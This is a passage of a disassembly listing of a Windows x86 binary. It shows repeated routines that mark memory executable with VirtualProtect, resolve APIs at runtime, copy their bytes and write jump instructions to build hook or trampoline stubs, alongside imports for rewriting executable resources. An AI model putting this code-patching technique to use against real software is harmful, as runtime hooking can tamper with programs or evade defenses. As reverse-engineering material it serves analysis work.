		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_4039A0	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403A90	proc near		; CODE XREF: sub_401082j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_403A90	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403AC0	proc near		; CODE XREF: sub_40105Aj

Memory		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_4]
		shl	eax, 2
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_20], eax
		mov	ecx, [ebp+var_20]
		mov	[ebp+var_10], ecx
		lea	edx, [ebp+arg_8]
		mov	[ebp+var_8], edx
		mov	[ebp+var_18], 0
		jmp	short loc_403AF9
; ---------------------------------------------------------------------------

loc_403AF0:				; CODE XREF: sub_403AC0+59j
		mov	eax, [ebp+var_18]
		add	eax, 1
		mov	[ebp+var_18], eax

loc_403AF9:				; CODE XREF: sub_403AC0+2Ej
		mov	ecx, [ebp+var_18]
		cmp	ecx, [ebp+arg_4]
		jge	short loc_403B1B
		mov	edx, [ebp+var_8]
		add	edx, 4
		mov	[ebp+var_8], edx
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_10]
		mov	edx, [ebp+var_8]
		mov	edx, [edx-4]
		mov	[ecx+eax*4], edx
		jmp	short loc_403AF0
; ---------------------------------------------------------------------------

loc_403B1B:				; CODE XREF: sub_403AC0+3Fj
		mov	eax, [ebp+arg_4]
		sub	eax, 1
		mov	[ebp+var_14], eax
		jmp	short loc_403B2F
; ---------------------------------------------------------------------------

loc_403B26:				; CODE XREF: sub_403AC0+86j
		mov	ecx, [ebp+var_14]
		sub	ecx, 1
		mov	[ebp+var_14], ecx

loc_403B2F:				; CODE XREF: sub_403AC0+64j
		cmp	[ebp+var_14], 0
		jl	short loc_403B48
		mov	edx, [ebp+var_14]
		shl	edx, 2
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_1C]
		push	dword ptr [eax]
		jmp	short loc_403B26
; ---------------------------------------------------------------------------

loc_403B48:				; CODE XREF: sub_403AC0+73j
		mov	eax, [ebp+arg_0]
		mov	ecx, [eax]
		mov	[ebp+var_4], ecx
		mov	eax, [ebp+var_4]
		call	eax
		mov	[ebp+var_C], eax
		mov	edx, [ebp+var_10]
		mov	[ebp+Memory], edx
		mov	eax, [ebp+Memory]
		push	eax		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	[ebp+var_8], 0
		mov	eax, [ebp+var_C]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_403AC0	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 35h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_403BB0(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_403BB0	proc near		; CODE XREF: sub_401014j

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_403BB0	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403CA0	proc near		; CODE XREF: sub_401005j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_403CA0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403CD0	proc near		; CODE XREF: sub_401023j

Memory		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_4]
		shl	eax, 2
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_20], eax
		mov	ecx, [ebp+var_20]
		mov	[ebp+var_10], ecx
		lea	edx, [ebp+arg_8]
		mov	[ebp+var_8], edx
		mov	[ebp+var_18], 0
		jmp	short loc_403D09
; ---------------------------------------------------------------------------

loc_403D00:				; CODE XREF: sub_403CD0+59j
		mov	eax, [ebp+var_18]
		add	eax, 1
		mov	[ebp+var_18], eax

loc_403D09:				; CODE XREF: sub_403CD0+2Ej
		mov	ecx, [ebp+var_18]
		cmp	ecx, [ebp+arg_4]
		jge	short loc_403D2B
		mov	edx, [ebp+var_8]
		add	edx, 4
		mov	[ebp+var_8], edx
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_10]
		mov	edx, [ebp+var_8]
		mov	edx, [edx-4]
		mov	[ecx+eax*4], edx
		jmp	short loc_403D00
; ---------------------------------------------------------------------------

loc_403D2B:				; CODE XREF: sub_403CD0+3Fj
		mov	eax, [ebp+arg_4]
		sub	eax, 1
		mov	[ebp+var_14], eax
		jmp	short loc_403D3F
; ---------------------------------------------------------------------------

loc_403D36:				; CODE XREF: sub_403CD0+86j
		mov	ecx, [ebp+var_14]
		sub	ecx, 1
		mov	[ebp+var_14], ecx

loc_403D3F:				; CODE XREF: sub_403CD0+64j
		cmp	[ebp+var_14], 0
		jl	short loc_403D58
		mov	edx, [ebp+var_14]
		shl	edx, 2
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_1C]
		push	dword ptr [eax]
		jmp	short loc_403D36
; ---------------------------------------------------------------------------

loc_403D58:				; CODE XREF: sub_403CD0+73j
		mov	eax, [ebp+arg_0]
		mov	ecx, [eax]
		mov	[ebp+var_4], ecx
		mov	eax, [ebp+var_4]
		call	eax
		mov	[ebp+var_C], eax
		mov	edx, [ebp+var_10]
		mov	[ebp+Memory], edx
		mov	eax, [ebp+Memory]
		push	eax		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	[ebp+var_8], 0
		mov	eax, [ebp+var_C]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_403CD0	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 35h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_403DC0(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_403DC0	proc near		; CODE XREF: sub_40104Bj

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_403DC0	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403EB0	proc near		; CODE XREF: sub_401037j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_403EB0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403EE0	proc near		; CODE XREF: sub_40101Ej

Memory		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_4]
		shl	eax, 2
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_20], eax
		mov	ecx, [ebp+var_20]
		mov	[ebp+var_10], ecx
		lea	edx, [ebp+arg_8]
		mov	[ebp+var_8], edx
		mov	[ebp+var_18], 0
		jmp	short loc_403F19
; ---------------------------------------------------------------------------

loc_403F10:				; CODE XREF: sub_403EE0+59j
		mov	eax, [ebp+var_18]
		add	eax, 1
		mov	[ebp+var_18], eax

loc_403F19:				; CODE XREF: sub_403EE0+2Ej
		mov	ecx, [ebp+var_18]
		cmp	ecx, [ebp+arg_4]
		jge	short loc_403F3B
		mov	edx, [ebp+var_8]
		add	edx, 4
		mov	[ebp+var_8], edx
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_10]
		mov	edx, [ebp+var_8]
		mov	edx, [edx-4]
		mov	[ecx+eax*4], edx
		jmp	short loc_403F10
; ---------------------------------------------------------------------------

loc_403F3B:				; CODE XREF: sub_403EE0+3Fj
		mov	eax, [ebp+arg_4]
		sub	eax, 1
		mov	[ebp+var_14], eax
		jmp	short loc_403F4F
; ---------------------------------------------------------------------------

loc_403F46:				; CODE XREF: sub_403EE0+86j
		mov	ecx, [ebp+var_14]
		sub	ecx, 1
		mov	[ebp+var_14], ecx

loc_403F4F:				; CODE XREF: sub_403EE0+64j
		cmp	[ebp+var_14], 0
		jl	short loc_403F68
		mov	edx, [ebp+var_14]
		shl	edx, 2
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_1C]
		push	dword ptr [eax]
		jmp	short loc_403F46
; ---------------------------------------------------------------------------

loc_403F68:				; CODE XREF: sub_403EE0+73j
		mov	eax, [ebp+arg_0]
		mov	ecx, [eax]
		mov	[ebp+var_4], ecx
		mov	eax, [ebp+var_4]
		call	eax
		mov	[ebp+var_C], eax
		mov	edx, [ebp+var_10]
		mov	[ebp+Memory], edx
		mov	eax, [ebp+Memory]
		push	eax		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	[ebp+var_8], 0
		mov	eax, [ebp+var_C]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_403EE0	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 35h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_403FD0(LPCSTR lpProcName, LPCSTR lpLibFileName, size_t Size)
sub_403FD0	proc near		; CODE XREF: sub_40100Fj

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
Src		= dword	ptr -0Ch
dwSize		= dword	ptr -8
flOldProtect	= dword	ptr -4
lpProcName	= dword	ptr  8
lpLibFileName	= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	[ebp+var_14], ecx
		mov	eax, [ebp+Size]
		add	eax, 5
		mov	[ebp+dwSize], eax
		mov	ecx, [ebp+dwSize]
		push	ecx		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_10], eax
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_10]
		mov	[edx], eax
		lea	ecx, [ebp+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		mov	edx, [ebp+dwSize]
		push	edx		; dwSize
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [ebp+lpProcName]
		push	edx		; lpProcName
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	[ebp+Src], eax
		mov	ecx, [ebp+Size]
		push	ecx		; Size
		mov	edx, [ebp+Src]
		push	edx		; Src
		mov	eax, [ebp+var_14]
		mov	ecx, [eax]
		push	ecx		; Dst
		call	_memcpy
		add	esp, 0Ch
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		add	eax, [ebp+Size]
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	byte ptr [eax],	0E9h
		mov	ecx, [ebp+var_14]
		mov	edx, [ecx]
		add	edx, 1
		mov	eax, [ebp+var_14]
		mov	[eax], edx
		mov	ecx, [ebp+var_14]
		mov	edx, [ebp+Src]
		sub	edx, [ecx]
		mov	eax, [ebp+Size]
		lea	ecx, [edx+eax-4]
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		mov	[eax], ecx
		mov	ecx, [ebp+Size]
		add	ecx, 1
		mov	edx, [ebp+var_14]
		mov	eax, [edx]
		sub	eax, ecx
		mov	ecx, [ebp+var_14]
		mov	[ecx], eax
		mov	eax, [ebp+var_14]
		mov	esp, ebp
		pop	ebp
		retn	0Ch
sub_403FD0	endp

; ---------------------------------------------------------------------------
		db 30h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4040C0	proc near		; CODE XREF: sub_401064j

var_8		= dword	ptr -8
Memory		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		mov	[ebp+var_8], ecx
		mov	eax, [ebp+var_8]
		mov	ecx, [eax]
		mov	[ebp+Memory], ecx
		mov	edx, [ebp+Memory]
		push	edx		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	esp, ebp
		pop	ebp
		retn
sub_4040C0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4040F0	proc near		; CODE XREF: sub_401041j

Memory		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_4]
		shl	eax, 2
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 4
		mov	[ebp+var_20], eax
		mov	ecx, [ebp+var_20]
		mov	[ebp+var_10], ecx
		lea	edx, [ebp+arg_8]
		mov	[ebp+var_8], edx
		mov	[ebp+var_18], 0
		jmp	short loc_404129
; ---------------------------------------------------------------------------

loc_404120:				; CODE XREF: sub_4040F0+59j
		mov	eax, [ebp+var_18]
		add	eax, 1
		mov	[ebp+var_18], eax

loc_404129:				; CODE XREF: sub_4040F0+2Ej
		mov	ecx, [ebp+var_18]
		cmp	ecx, [ebp+arg_4]
		jge	short loc_40414B
		mov	edx, [ebp+var_8]
		add	edx, 4
		mov	[ebp+var_8], edx
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_10]
		mov	edx, [ebp+var_8]
		mov	edx, [edx-4]
		mov	[ecx+eax*4], edx
		jmp	short loc_404120
; ---------------------------------------------------------------------------

loc_40414B:				; CODE XREF: sub_4040F0+3Fj
		mov	eax, [ebp+arg_4]
		sub	eax, 1
		mov	[ebp+var_14], eax
		jmp	short loc_40415F
; ---------------------------------------------------------------------------

loc_404156:				; CODE XREF: sub_4040F0+86j
		mov	ecx, [ebp+var_14]
		sub	ecx, 1
		mov	[ebp+var_14], ecx

loc_40415F:				; CODE XREF: sub_4040F0+64j
		cmp	[ebp+var_14], 0
		jl	short loc_404178
		mov	edx, [ebp+var_14]
		shl	edx, 2
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_10]
		add	eax, [ebp+var_1C]
		push	dword ptr [eax]
		jmp	short loc_404156
; ---------------------------------------------------------------------------

loc_404178:				; CODE XREF: sub_4040F0+73j
		mov	eax, [ebp+arg_0]
		mov	ecx, [eax]
		mov	[ebp+var_4], ecx
		mov	eax, [ebp+var_4]
		call	eax
		mov	[ebp+var_C], eax
		mov	edx, [ebp+var_10]
		mov	[ebp+Memory], edx
		mov	eax, [ebp+Memory]
		push	eax		; Memory
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 4
		mov	[ebp+var_8], 0
		mov	eax, [ebp+var_C]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4040F0	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 2Fh dup(0CCh)
; ---------------------------------------------------------------------------
		jmp	ds:LoadResource
; ---------------------------------------------------------------------------
		jmp	ds:SizeofResource
; ---------------------------------------------------------------------------
		jmp	ds:GetModuleFileNameA
; ---------------------------------------------------------------------------
		jmp	ds:CloseHandle
; ---------------------------------------------------------------------------
		jmp	ds:ReadFile
; ---------------------------------------------------------------------------
		jmp	ds:GetFileSize
; ---------------------------------------------------------------------------
		jmp	ds:CreateFileA
; ---------------------------------------------------------------------------
		jmp	ds:EndUpdateResourceA
; ---------------------------------------------------------------------------
		jmp	ds:UpdateResourceA
; ---------------------------------------------------------------------------
		jmp	ds:SetFilePointer
; ---------------------------------------------------------------------------
		jmp	ds:BeginUpdateResourceA
; ---------------------------------------------------------------------------
		jmp	ds:FindResourceA
; ---------------------------------------------------------------------------
		jmp	ds:WriteFile
; ---------------------------------------------------------------------------
		jmp	ds:GetVolumeInformationA
; ---------------------------------------------------------------------------
		jmp	ds:GetEnvironmentVariableA
; ---------------------------------------------------------------------------
		jmp	ds:CreateMutexA
; ---------------------------------------------------------------------------
		jmp	ds:OpenMutexA
; ---------------------------------------------------------------------------
		jmp	ds:GetProcAddress
; ---------------------------------------------------------------------------
		jmp	ds:LoadLibraryA
; ---------------------------------------------------------------------------
		jmp	ds:VirtualProtect
; ---------------------------------------------------------------------------
		jmp	ds:DialogBoxParamA
; ---------------------------------------------------------------------------
		jmp	ds:SetDlgItemTextA
; ---------------------------------------------------------------------------
		jmp	ds:DestroyWindow
; ---------------------------------------------------------------------------
		jmp	ds:EnableWindow
; ---------------------------------------------------------------------------
		jmp	ds:GetDlgItem
; ---------------------------------------------------------------------------
		jmp	ds:IsDlgButtonChecked
; ---------------------------------------------------------------------------
		jmp	ds:SetCursor
; ---------------------------------------------------------------------------
		jmp	ds:LoadCursorA
; ---------------------------------------------------------------------------
		jmp	ds:PtInRect
; ---------------------------------------------------------------------------
		jmp	ds:GetWindowRect
; ---------------------------------------------------------------------------
		jmp	ds:GetCursorPos
; ---------------------------------------------------------------------------
		jmp	ds:MessageBoxA
; ---------------------------------------------------------------------------
		jmp	ds:EndDialog
; ---------------------------------------------------------------------------
		jmp	ds:SetWindowPos
; ---------------------------------------------------------------------------
		jmp	ds:CheckDlgButton
; ---------------------------------------------------------------------------
		jmp	ds:SendMessageA
; ---------------------------------------------------------------------------
		jmp	ds:LoadIconA
; ---------------------------------------------------------------------------
		align 10h
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD "+"	TO EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD "+" TO EXPAND]
; [00000120 BYTES: COLLAPSED FUNCTION _realloc.	PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD "+"	TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD	"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION __heap_alloc. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD "+"	TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION _JumpToContinuation(void *,EHRegistrationNode *).	PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
; [00000007 BYTES: COLLAPSED FUNCTION sub_40458C. PRESS	KEYPAD "+" TO EXPAND]
; [00000007 BYTES: COLLAPSED FUNCTION sub_404593. PRESS	KEYPAD "+" TO EXPAND]
; [00000007 BYTES: COLLAPSED FUNCTION sub_40459A. PRESS	KEYPAD "+" TO EXPAND]
; [0000004F BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION ___CxxFrameHandler. PRESS	KEYPAD "+" TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __CxxLongjmpUnwind(x). PRESS KEYPAD "+" TO EXPAND]
; [00000054 BYTES: COLLAPSED FUNCTION _CallCatchBlock2(EHRegistrationNode *,_s_FuncInfo	const *,void *,int,ulong). PRESS KEYPAD	"+" TO EXPAND]
; [00000025 BYTES: COLLAPSED FUNCTION CatchGuardHandler(EHExceptionRecord *,CatchGuardRN *,void	*,void *). PRESS KEYPAD	"+" TO EXPAND]
; [000000B4 BYTES: COLLAPSED FUNCTION _CallSETranslator(EHExceptionRecord *,EHRegistrationNode *,void *,void *,_s_FuncInfo const *,int,EHRegistrationNode *). PRESS KEYPAD "+" TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION TranslatorGuardHandler(EHExceptionRecord *,TranslatorGuardRN *,void *,void *). PRESS KEYPAD "+" TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION _GetRangeOfTrysToCheck(_s_FuncInfo const *,int,int,uint *,uint *). PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD "+" TO EXPAND]
; [00000022 BYTES: COLLAPSED FUNCTION __unwind_handler.	PRESS KEYPAD "+" TO EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD "+"	TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD "+" TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __NLG_Notify1. PRESS KEYPAD "+" TO EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD "+" TO	EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, [esp+4]
